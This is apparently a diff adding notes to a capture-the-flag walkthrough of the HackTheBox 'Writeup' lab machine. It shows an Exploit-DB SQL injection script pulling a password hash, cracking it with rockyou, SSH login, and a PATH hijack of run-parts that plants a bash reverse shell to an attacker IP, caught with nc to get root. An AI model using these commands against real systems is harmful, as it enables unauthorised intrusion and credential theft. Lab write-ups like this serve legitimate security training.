@@ -34,3 +34,103 @@ http://10.10.10.138/writeup
 
 admin login interface
 http://10.10.10.138/writeup/admin
+
+
+the email from home
+
+jkr@writeup.htb
+
+https://www.exploit-db.com/exploits/46635
+
+./46635.py -u http://10.10.10.138/writeup/
+
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+
+
+./hashcrack.py ~/Downloads/passwords/rockyou.txt
+
+62def4866937f08cc13bab43bb14e6f7 : 62def4866937f08cc13bab43bb14e6f7
+Hash: 62def4866937f08cc13bab43bb14e6f7
+Output:
+[+] Password cracked: raykayjay9
+
+
+ssh jkr@10.10.10.138
+
+----------------------------------------
+
+
+jkr@writeup:~$ uname -a
+Linux writeup 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
+
+pspy64
+
+    runs clean up script which deletes files > 3 minutes old
+
+
+    2019/09/24 02:58:02 CMD: UID=0    PID=4119   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
+
+
+    on login it executes run-parts
+    we can modify that to run commands
+
+    2019/09/24 02:59:59 CMD: UID=0    PID=4144   | sshd: jkr [priv]
+    2019/09/24 02:59:59 CMD: UID=0    PID=4145   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+    2019/09/24 02:59:59 CMD: UID=0    PID=4146   | run-parts --lsbsysinit /etc/update-motd.d
+
+
+want to run a file on path
+
+    /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+    touch /usr/local/bin/run-parts; chmod 777 /usr/local/bin/run-parts; echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.231/12344 0>&1'" > /usr/local/bin/run-parts
+
+then login again to cause the run-parts script to execute
+reverse shell
+
+    $ nc -vlk 12344
+
+    Listening on [0.0.0.0] (family 0, port 12344)
+    Connection from [10.10.10.138] port 12344 [tcp/*] accepted (family 2, sport 39624)
+    bash: cannot set terminal process group (3962): Inappropriate ioctl for device
+    bash: no job control in this shell
+
+    root@writeup:/# ls
+    ls
+    bin
+    boot
+    dev
+    etc
+    home
+    initrd.img
+    initrd.img.old
+    lib
+    lib64
+    lost+found
+    media
+    mnt
+    opt
+    proc
+    root
+    run
+    sbin
+    srv
+    sys
+    tmp
+    usr
+    var
+    vmlinuz
+    vmlinuz.old
+
+    root@writeup:/# cd root
+    cd root
+
+    root@writeup:/root# ls
+    ls
+    bin
+    root.txt
+
+
